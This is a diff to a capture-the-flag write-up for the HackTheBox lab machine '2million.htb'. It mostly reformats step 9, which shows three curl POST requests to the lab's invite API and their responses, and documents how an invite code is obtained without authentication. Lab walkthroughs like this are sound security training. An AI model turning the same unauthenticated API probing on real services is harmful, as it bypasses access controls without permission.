@@ -41,20 +41,24 @@ This flaw breaks the intended access‑control design and exposes internal funct
 
 9.Decoded the invite code and obtained a valid invitation key without any form of authentication or access control.
 
+```
 ### Request:
 ```
 curl -X POST http://2million.htb/api/v1/invite/how/to/generate \
      -H "Content-Type: application/json" \
      -d '{"code":"MYTESTCODE"}'
-
-```
+     
+__________________________
 curl -X POST http://2million.htb/api/v1/invite/how/to/verify \
      -H "Content-Type: application/json" \
      -d '{"code":"MYTESTCODE"}'
-```
+     
+__________________________
 curl -X POST http://2million.htb/api/v1/invite/generate \ 
      -H "Content-Type: application/json" \
      -d '{"code":"MYTESTCODE"}'
+```
+
 
 ### Response:
 ```
@@ -68,8 +72,7 @@ curl -X POST http://2million.htb/api/v1/invite/generate \
   "hint": "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
 }
 
-
-```
+__________________________
 <html>
 <head><title>301 Moved Permanently</title></head>
 <body>
@@ -78,7 +81,7 @@ curl -X POST http://2million.htb/api/v1/invite/generate \
 </body>
 </html>
 
-```
+__________________________
 {
   "0": 200,
   "success": 1,
@@ -87,6 +90,7 @@ curl -X POST http://2million.htb/api/v1/invite/generate \
     "format": "encoded"
   }
 }
+```
 
 
 ---
